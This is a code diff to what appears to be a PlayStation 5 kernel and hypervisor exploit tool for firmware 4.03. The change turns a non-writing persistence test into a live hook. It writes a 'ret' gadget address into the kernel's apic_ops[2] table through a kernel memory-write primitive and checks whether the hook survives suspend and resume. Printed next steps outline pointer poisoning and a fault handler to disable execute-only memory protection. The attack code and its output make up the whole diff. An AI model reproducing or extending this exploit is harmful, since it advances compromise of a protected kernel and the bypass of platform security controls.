@@ -5313,29 +5313,81 @@ static void campaign_flatz_setup(void) {
                 printf("    Original saved: (unavailable)\n");
             }
 
+            /* Check if hook target was saved in cave marker offset 0x18 */
+            uint64_t saved_hook_target = 0;
+            if (cave_persisted) {
+                uint64_t cp2 = va_to_pa_quiet(g_kdata_base);
+                if (cp2) {
+                    uint8_t ht[8];
+                    kernel_copyout(g_dmap_base + cp2 + 0x18, ht, 8);
+                    memcpy(&saved_hook_target, ht, 8);
+                }
+            }
+
+            /* Compute expected nop_ret for this boot */
+            uint64_t expected_nop_ret =
+                g_kdata_base + (int64_t)(-0x9d20caLL);
+
+            int hook_survived = (saved_hook_target &&
+                                 xapic_now == saved_hook_target);
+            int hook_was_nop_ret = (saved_hook_target == expected_nop_ret);
+
             /* ── Summary ── */
             printf("\n[+] ============================================\n");
-            printf("[+]  PERSISTENCE TEST RESULTS\n");
+            printf("[+]  POST-RESUME HOOK TEST RESULTS\n");
             printf("[+] ============================================\n");
-            printf("[+]   Cave marker:   %s\n",
+            printf("[+]   Cave marker:     %s\n",
                    cave_persisted ? "PERSISTED" : "LOST");
-            printf("[+]   QA flags:      %s\n",
+            printf("[+]   QA flags:        %s\n",
                    qa_persisted ? "PERSISTED" : "reinitialized");
-            printf("[+]   apic_ops[2]:   %s\n",
-                   orig_xapic ?
-                   (xapic_now == orig_xapic ? "UNCHANGED (good for hook)"
-                                            : "CHANGED (kernel reinits)")
-                   : "(cannot compare — no saved original)");
+            printf("[+]   apic_ops[2] now: 0x%016lx\n",
+                   (unsigned long)xapic_now);
+            if (orig_xapic)
+                printf("[+]   Original xapic:  0x%016lx\n",
+                       (unsigned long)orig_xapic);
+            if (saved_hook_target)
+                printf("[+]   Hook target:     0x%016lx%s\n",
+                       (unsigned long)saved_hook_target,
+                       hook_was_nop_ret ? " (nop_ret)" : "");
 
-            if (orig_xapic && xapic_now == orig_xapic) {
+            if (hook_survived) {
                 printf("[+]\n");
-                printf("[+] KEY FINDING: apic_ops[2] retains its value across\n");
-                printf("[+] resume! The flatz method (hook apic_ops[2]) IS viable.\n");
-                printf("[+] → Next: find a safe ktext gadget to hook with.\n");
-            } else if (orig_xapic && xapic_now != orig_xapic) {
+                printf("[+] *** HOOK SURVIVED RESUME! ***\n");
+                printf("[+] apic_ops[2] still points to our hook target.\n");
+                printf("[+] cpususpend_handler called our 'ret' gadget.\n");
+                printf("[+] The flatz method WORKS on FW 4.03!\n");
                 printf("[+]\n");
-                printf("[-] apic_ops[2] was reinitialized by the kernel.\n");
-                printf("    Hooking it pre-suspend won't persist across resume.\n");
+                printf("[+] Next: replace bare ret with pointer poisoning\n");
+                printf("[+] (non-canonical addr) + #GP handler to disable XOM.\n");
+
+                /* Restore original xapic_mode */
+                if (orig_xapic) {
+                    printf("\n[*] Restoring apic_ops[2] → original...\n");
+                    uint64_t restore_pa = va_to_pa_quiet(g_apic_ops_addr);
+                    if (restore_pa) {
+                        kernel_copyin(&orig_xapic,
+                                      g_dmap_base + restore_pa + 0x10,
+                                      8);
+                        uint64_t rv = 0;
+                        kernel_copyout(g_dmap_base + restore_pa + 0x10,
+                                       &rv, 8);
+                        printf("    Restored: 0x%016lx [%s]\n",
+                               (unsigned long)rv,
+                               rv == orig_xapic ? "OK" : "FAIL");
+                    }
+                }
+            } else if (orig_xapic && xapic_now == orig_xapic &&
+                       saved_hook_target) {
+                printf("[+]\n");
+                printf("[-] Hook was OVERWRITTEN — kernel reinitialized\n");
+                printf("    apic_ops[2] back to original during resume.\n");
+            } else if (orig_xapic && xapic_now == orig_xapic) {
+                printf("[+]\n");
+                printf("[*] apic_ops[2] matches original (no hook was set,\n");
+                printf("    or hook was overwritten by kernel reinit).\n");
+            } else {
+                printf("[+]\n");
+                printf("[?] apic_ops[2] has unexpected value.\n");
             }
 
             /* Clear QA marker */
@@ -5346,23 +5398,24 @@ static void campaign_flatz_setup(void) {
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: safe persistence test ─── */
-            printf("\n[*] Phase 7: Safe persistence test (cave marker + QA only)\n\n");
+            /* ─── Pre-suspend: hook apic_ops[2] → nop_ret ─── */
+            printf("\n[*] Phase 7: Hook apic_ops[2] → nop_ret (flatz method)\n\n");
 
             /*
-             * SAFE APPROACH — NO writes to apic_ops region at all.
+             * APPROACH:
+             *   1. Save original xapic_mode in cave marker + QA flags
+             *   2. Hook apic_ops[2] to nop_ret (bare "ret" in ktext)
+             *      from ps5-kstuff: kdata_base - 0x9d20ca
+             *   3. Enter rest mode
              *
-             * LESSONS LEARNED:
-             *   - Hooking apic_ops[2] → different function: system instability
-             *   - Writing to ops[28] (past table end): overwrites a valid ktext
-             *     pointer, prevents rest mode (suspend hangs)
+             * On resume, cpususpend_handler calls xapic_mode which now
+             * executes "ret" immediately.  This is safe because:
+             *   - nop_ret is in ktext (natively executable, no SMEP/NX)
+             *   - A bare ret doesn't corrupt APIC state
+             *   - Previous hook to apic_create caused instability because
+             *     that function actively modifies APIC registers
              *
-             * We ONLY write to:
-             *   1. kdata cave (32 bytes at kdata_base) — known safe
-             *   2. QA flags — known safe
-             *
-             * Post-resume compares apic_ops[2] to the saved original
-             * to determine if the kernel reinitialises the table.
+             * If the system resumes without crashing: THE HOOK FIRED.
              */
 
             uint64_t original_xapic = ops[2];
@@ -5437,59 +5490,89 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
-            /* ── Step 3: kdata PTE diagnostics ── */
-            printf("\n[*] Step 3: kdata PTE diagnostics...\n");
+            /* ── Step 3: Hook apic_ops[2] → nop_ret (ktext) ──
+             *
+             * From ps5-kstuff (FW 4.03):
+             *   nop_ret = kdata_base - 0x9d20ca  (wrmsr_ret + 2)
+             *   This is a bare "ret" instruction in ktext.
+             *
+             * Hooking xapic_mode to a bare ret:
+             *   - Called during resume by cpususpend_handler
+             *   - Returns immediately (EAX = whatever caller left)
+             *   - No APIC state corruption (unlike hooking to apic_create)
+             *   - Lives in ktext → natively executable (no NX/SMEP issues)
+             *
+             * If the system resumes stably: THE HOOK FIRED.
+             * apic_ops[2] post-resume will differ from the saved original
+             * in the cave marker, confirming persistence + execution.
+             */
+            printf("\n[*] Step 3: Hooking apic_ops[2] → nop_ret...\n");
 
-            uint64_t w_e;
-            uint64_t w_pa;
-            w_pa = g_cr3_phys + ((cave_kva >> 39) & 0x1FF) * 8;
-            kernel_copyout(g_dmap_base + w_pa, &w_e, 8);
-            if (w_e & PTE_PRESENT) {
-                w_pa = (w_e & PTE_PA_MASK) + ((cave_kva >> 30) & 0x1FF) * 8;
-                kernel_copyout(g_dmap_base + w_pa, &w_e, 8);
-                if (w_e & PTE_PRESENT && !(w_e & PTE_PS)) {
-                    w_pa = (w_e & PTE_PA_MASK) + ((cave_kva >> 21) & 0x1FF) * 8;
-                    kernel_copyout(g_dmap_base + w_pa, &w_e, 8);
-                    if (w_e & PTE_PRESENT) {
-                        if (w_e & PTE_PS) {
-                            printf("    kdata 2MB PDE: 0x%016lx  NX=%d RW=%d G=%d\n",
-                                   (unsigned long)w_e,
-                                   (int)(w_e >> 63), (int)((w_e >> 1) & 1),
-                                   (int)((w_e >> 8) & 1));
-                        } else {
-                            w_pa = (w_e & PTE_PA_MASK) +
-                                   ((cave_kva >> 12) & 0x1FF) * 8;
-                            kernel_copyout(g_dmap_base + w_pa, &w_e, 8);
-                            printf("    kdata 4KB PTE: 0x%016lx  NX=%d RW=%d G=%d\n",
-                                   (unsigned long)w_e,
-                                   (int)(w_e >> 63), (int)((w_e >> 1) & 1),
-                                   (int)((w_e >> 8) & 1));
-                        }
+            uint64_t nop_ret_addr = g_kdata_base + (int64_t)(-0x9d20caLL);
+            int nop_in_ktext = (nop_ret_addr >= g_ktext_base &&
+                                nop_ret_addr < g_ktext_base + 0x2000000);
+
+            printf("    nop_ret address: 0x%016lx",
+                   (unsigned long)nop_ret_addr);
+            if (nop_in_ktext)
+                printf("  (ktext+0x%lx)",
+                       (unsigned long)(nop_ret_addr - g_ktext_base));
+            printf("\n");
+            printf("    Original xapic:  0x%016lx\n",
+                   (unsigned long)original_xapic);
+
+            if (!nop_in_ktext) {
+                printf("[-] nop_ret not in ktext range — aborting hook.\n");
+            } else {
+                /* Write nop_ret to apic_ops[2] via DMAP */
+                kernel_copyin(&nop_ret_addr,
+                              g_dmap_base + ops_pa + 0x10, 8);
+
+                /* Verify */
+                uint64_t hook_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10,
+                               &hook_verify, 8);
+                int hook_ok = (hook_verify == nop_ret_addr);
+                printf("    Write verify:    0x%016lx [%s]\n",
+                       (unsigned long)hook_verify,
+                       hook_ok ? "OK" : "MISMATCH");
+
+                if (!hook_ok) {
+                    printf("[-] Hook write failed.\n");
+                } else {
+                    /* Also store hook target in cave marker at 0x18 */
+                    uint64_t cave_pa2 = va_to_pa_quiet(g_kdata_base);
+                    if (cave_pa2) {
+                        kernel_copyin(&nop_ret_addr,
+                                      g_dmap_base + cave_pa2 + 0x18,
+                                      8);
                     }
                 }
             }
 
             printf("\n[+] ============================================\n");
-            printf("[+]  PERSISTENCE TEST ARMED\n");
+            printf("[+]  APIC_OPS[2] HOOKED → NOP_RET (bare ret)\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
             printf("[+] What was set:\n");
-            printf("[+]   Cave marker (kdata_base):  FLATZHOO magic\n");
-            printf("[+]   QA flags:                  Phase 7 marker\n");
-            printf("[+]   apic_ops region:           NOT MODIFIED (safe)\n");
+            printf("[+]   Cave marker:    FLATZHOO + original xapic\n");
+            printf("[+]   QA flags:       Phase 7 marker\n");
+            printf("[+]   apic_ops[2]:    0x%016lx (nop_ret)\n",
+                   (unsigned long)nop_ret_addr);
+            printf("[+]   Original was:   0x%016lx\n",
+                   (unsigned long)original_xapic);
             printf("[+]\n");
             printf("[+] WHAT THIS TESTS:\n");
-            printf("[+]   1. Does kdata cave survive resume? (marker)\n");
-            printf("[+]   2. Does apic_ops[2] retain its value? (compare)\n");
-            printf("[+]   3. Is KASLR stable? (ktext_base compare)\n");
+            printf("[+]   1. Does the hook survive resume?\n");
+            printf("[+]   2. Does xapic_mode(=ret) cause instability?\n");
+            printf("[+]   3. If system resumes OK: HOOK FIRED SAFELY.\n");
             printf("[+]\n");
             printf("[+] NEXT STEPS:\n");
             printf("[+]   1. Enter REST MODE now\n");
             printf("[+]   2. Wake PS5 and re-run exploit\n");
-            printf("[+]   3. Post-resume will check all markers\n");
-            printf("[+]   4. NO system instability — nothing modified\n");
+            printf("[+]   3. Post-resume will detect the hook and report\n");
 
-            notify("[HV Research] Phase 7: Safe test armed. Enter REST MODE!");
+            notify("[HV Research] Phase 7: apic_ops[2] hooked! Enter REST MODE!");
         }
 
         /* ─── Phase 8: IDT + kstuff offset verification ───
@@ -5743,7 +5826,7 @@ static void campaign_flatz_setup(void) {
             printf("    RSP0 (ring-0 stack): 0x%016lx\n",
                    (unsigned long)rsp0);
 
-            int tss_valid = (rsp0 >= 0xFFFFFFFF80000000ULL);
+            int tss_valid = (rsp0 >= 0xFFFF800000000000ULL);
             printf("    TSS looks %s\n\n",
                    tss_valid ? "valid" : "INVALID");
 
